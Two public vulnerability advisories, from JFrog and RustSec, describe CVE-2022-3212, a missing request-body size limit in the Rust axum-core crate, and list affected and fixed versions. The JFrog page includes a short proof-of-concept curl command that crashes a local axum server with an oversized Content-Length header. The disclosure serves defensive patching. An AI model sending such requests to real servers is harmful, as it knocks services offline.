=== Content from research.jfrog.com_b66cb574_20250108_135615.html ===

[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)JFrog Security Research

* [Discover](/vulnerabilities/)
* [Follow JFrog Security
  ![twitter](/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg)](https://twitter.com/JFrogSecurity)
![Menu](/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg)![Menu](data:image/svg+xml...)![Menu](/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg)

* [Home](/)
* [Discover](/vulnerabilities/)
* [Follow JFrog Security](https://twitter.com/JFrogSecurity)
[< Back](/vulnerabilities/)
# - axum-core missing request size limit DoS

CVE-2022-3212
| CVSS 7.5

 JFrog Severity:high

Discovered By**Ori Hollander**of the JFrog Security Research Team

Published 31 Aug, 2022 | Last updated 31 Aug, 2022

## [Summary](#summary)

A missing request size limit for HTTP requests in axum-core can allow network attackers to perform denial of service

## [Component](#component)

[axum-core](https://crates.io/crates/axum-core)

## [Affected versions](#affected-versions)

axum-core (, 0.2.7], fixed in 0.2.8

axum-core (, 0.3.0-rc.1], fixed in 0.3.0-rc.2

## [Description](#description)

`<bytes::Bytes as axum_core::extract::FromRequest>::from_request` would not, by default, set a limit for the size of the request body. That meant if a malicious peer would send a request with a very large `Content-Length` header (even if the body itself is not very large), the Rust allocator would panic (due to a failed allocation) and the process would crash.

This also applies to these extractors which used `Bytes::from_request` internally:

* `axum::extract::Form`
* `axum::extract::Json`
* `String`

## [PoC](#poc)

```
git clone https://github.com/tokio-rs/axum

cd axum/examples && cargo run -p example-readme

curl -v -X POST "http://127.0.0.1:3000/users" -H "Content-Type: application/json" \
--data `python3 -c "import sys; sys.stdout.write('a'*10000)"` -H "Content-Length: 11111111111111111111"

```
## [Vulnerability Mitigations](#vulnerability-mitigations)

No mitigations are provided for this vulnerability.

In order to fully fix this vulnerability, we recommend upgrading axum-core to version 0.2.8

The fixed [axum](https://github.com/tokio-rs/axum) version is 0.5.16

## [References](#references)

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-3212)

[< Back](/vulnerabilities/)[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)

* [Terms of Use](https://jfrog.com/terms-of-use/)
* [Cookies Policy](https://jfrog.com/jfrog-cookies-policy/)
* [Privacy Policy](https://jfrog.com/privacy-policy/)
* Cookies Settings

©2025 All Rights Reserved. JFrog Ltd.



=== Content from rustsec.org_f9d2bbc4_20250108_135616.html ===


RUSTSEC-2022-0055: axum-core: No default limit put on request bodies › RustSec Advisory Database

#

[About](/)
[Advisories](/advisories/)
[Report Vulnerabilities](/contributing.html)

[History](https://github.com/RustSec/advisory-db/commits/main/crates/axum-core/RUSTSEC-2022-0055.md) ⋅
[Edit](https://github.com/RustSec/advisory-db/edit/main/crates/axum-core/RUSTSEC-2022-0055.md) ⋅
[JSON (OSV)](https://api.osv.dev/v1/vulns/RUSTSEC-2022-0055)

# RUSTSEC-2022-0055

No default limit put on request bodies

Reported
August 31, 2022

Issued
September 13, 2022

(last modified: June 13, 2023)

Package
[axum-core](/packages/axum-core.html)
([crates.io](https://crates.io/crates/axum-core))

Type
Vulnerability

Categories

* [denial-of-service](/categories/denial-of-service.html)

Keywords
[#ddos](/keywords/ddos.html)
[#oom](/keywords/oom.html)

Aliases

* [CVE-2022-3212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3212)
* [GHSA-m77f-652q-wwp4](https://github.com/advisories/GHSA-m77f-652q-wwp4)

References

* <https://github.com/tokio-rs/axum/pull/1346>

Patched

* `>=0.2.8, <0.3.0-rc.1`
* `>=0.3.0-rc.2`

### Description

`<bytes::Bytes as axum_core::extract::FromRequest>::from_request` would not, by
default, set a limit for the size of the request body. That meant if a malicious
peer would send a very large (or infinite) body your server might run out of
memory and crash.

This also applies to these extractors which used `Bytes::from_request`
internally:

* `axum::extract::Form`
* `axum::extract::Json`
* `String`

The fix is also in `axum-core` `0.3.0.rc.2` but `0.3.0.rc.1` *is* vulnerable.

Because `axum` depends on `axum-core` it is vulnerable as well. The vulnerable
versions of `axum` are `<= 0.5.15` and `0.6.0.rc.1`. `axum` `>= 0.5.16` and
`>= 0.6.0.rc.2` does have the fix and are not vulnerable.

The patched versions will set a 2 MB limit by default.

Advisory available under [CC0-1.0](https://spdx.org/licenses/CC0-1.0.html)
license.


